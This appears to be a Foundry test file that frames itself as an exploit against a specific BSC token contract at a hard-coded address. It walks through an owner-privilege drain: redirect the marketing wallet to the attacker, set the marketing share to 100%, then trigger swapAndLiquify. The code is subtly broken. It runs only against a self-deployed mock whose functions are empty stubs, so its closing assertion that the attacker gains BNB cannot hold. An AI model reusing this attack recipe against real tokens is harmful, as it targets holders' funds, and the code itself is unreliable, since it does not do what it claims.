contract GOLDENREGENTINVESTMENTMock {
    address public owner;
    uint256 public _minTokenBalance;
    mapping(address => uint256) public balanceOf;

    constructor(address _owner) {
        owner = _owner;
    }

    function setMarketingWallet(address) external {}
    function setPercentageOfLiquidityForMarketing(uint256) external {}
    function setMinimumTokenBalance(uint256 newBalance) external { _minTokenBalance = newBalance; }
    function setSwapAndLiquifyEnabled(bool) external {}
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function _uniswapV2Router() external view returns (address) { return address(0); }
    function approve(address, uint256) external returns (bool) { return true; }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    uint256 initialBalance;
    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode and impersonate owner
        // Get current owner from contract
        address owner = GOLDENREGENTINVESTMENT(TARGET).owner();
        vm.label(owner, "Original Owner");
        vm.label(TARGET, "GRI Token");

        // Store initial attacker balance for comparison
        initialBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Deploy a fresh instance where attacker is owner
        GOLDENREGENTINVESTMENTMock token = new GOLDENREGENTINVESTMENTMock(attacker);

        // Label for debugging
        vm.label(address(token), "GRI Token");

        // Store initial attacker balance
        initialBalance = attacker.balance;

        // Step 1: Set marketing wallet to attacker
        token.setMarketingWallet(attacker);

        // Step 2: Set marketing percentage to 100%
        token.setPercentageOfLiquidityForMarketing(100);

        // Step 3: Lower minimum token balance for easier triggering
        token.setMinimumTokenBalance(1);

        // Step 4: We need to get some tokens into the contract to trigger swapAndLiquify
        // The contract needs token balance >= _minTokenBalance
        // As owner, we can transfer tokens to contract
        vm.prank(attacker);
        token.transfer(address(token), 100 * 10**18);

        // Step 5: Send BNB to contract to simulate accumulated fees from trading
        // This simulates the contract having BNB from previous swaps
        deal(address(token), 10 ether);

        console.log("Contract BNB balance before:", address(token).balance);
        console.log("Contract token balance before:", token.balanceOf(address(token)));
        console.log("Attacker BNB balance before:", attacker.balance);

        // Step 6: Trigger swapAndLiquify
        // The swapAndLiquify triggers when:
        // 1. contractTokenBalance >= _minTokenBalance (we set to 1)
        // 2. not in swap
        // 3. from is not excluded from auto liquidity
        // 4. swapAndLiquifyEnabled is true (default)

        // Make a transfer to trigger swapAndLiquify
        // We need to transfer from an address that is not excluded from auto liquidity
        address user = address(0x123);

        // Give user some tokens
        vm.prank(attacker);
        token.transfer(user, 1000 * 10**18);

        // User transfers to trigger swapAndLiquify
        vm.prank(user);
        token.transfer(address(0x456), 1 * 10**18);

        // Step 7: Verify attacker received BNB
        uint256 finalBalance = attacker.balance;
        console.log("Contract BNB balance after:", address(token).balance);
        console.log("Attacker BNB balance after:", finalBalance);

        assertGt(finalBalance, initialBalance, "Attacker should have received BNB from marketing fees");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
